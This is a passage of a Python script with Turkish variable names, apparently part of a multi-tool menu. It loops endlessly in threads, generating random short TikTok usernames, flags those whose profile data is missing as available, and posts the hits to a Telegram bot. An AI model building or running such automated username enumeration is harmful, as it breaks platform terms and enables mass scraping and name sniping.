            takip_edilen = veri.split('followingCount":')[1].split(',"')[0]      
            say(f'Bad Username: {kullanici_adi}', font='console', colors=['red'], align='left')
            
        except (KeyError, IndexError):
            say(f'Hit Username: {kullanici_adi}', font='console', colors=['green'], align='left')
            
            mesaj = f'''
    USERNAME: @{kullanici_adi}
    ══════════════
    𝑩𝒀 ~ @RayqPy ~ @RayqTool        
    '''
            requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={kimlik}&text={mesaj}')
    
        except requests.exceptions.ConnectionError:
            print("İnternet bağlantısı kesildi!")
    
    def rastgele_kullanicilar():
        while True:
            h1 = ''.join(random.choice('123546789qwertyuiop') for i in range(1))
            h2 = ''.join(random.choice('3qwertyuiop') for i in range(1))
            h3 = ''.join(random.choice('qwertyuiop') for i in range(1))
            h4 = ''.join(random.choice('qwertyuiop') for i in range(1))
            h5 = ''.join(random.choice('1234567890qwertyuiopqwertyuiopasdfghjklzxcvbnm') for i in range(1))
            h6 = ''.join(random.choice('1234567890qwertyuiopqwertyuiopasdfghjklzxcvbnm') for i in range(1))
            h7 = ''.join(random.choice('1234567890qwertyuiopqwertyuiopasdfghjklzxcvbnm') for i in range(1))
            tum_harfler = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
            rastgele_harf = random.choice(tum_harfler)
            farkli_harf = random.choice(tum_harfler.replace(rastgele_harf, ''))
            yapi = rastgele_harf * (6 - 1) + farkli_harf  
            karisik = ''.join(random.sample(yapi, 6))             
            kullanici_adi_4 = h5 + '__' + h6 + '' + h7
            kullanici_adi_6 = h1 + '' + h2 + '' + h7 + h3
            kullanici_adi_7 = h1 + '' + h2 + '' + h7 + h4 + '_'
            kullanici_adi_8 = h1 + '_' + h2 + '_' + h7
            kullanici_adi_9 = h1 + '_' + h2 + '_' + h3
            grup = (kullanici_adi_4, kullanici_adi_6, kullanici_adi_7, kullanici_adi_8, kullanici_adi_9)
            kullanici_adi = random.choice(grup)
            TikTok(kullanici_adi)
    
    is_parcalari = []
    for _ in range(2):
        t = threading.Thread(target=rastgele_kullanicilar)
        t.start()
        is_parcalari.append(t)
    
    for is_parcasi in is_parcalari:
        is_parcasi.join()
    
    
    
    
elif secim == "9":
    print(">>> Rayq Telegram 5l...")              
    print("Kapali")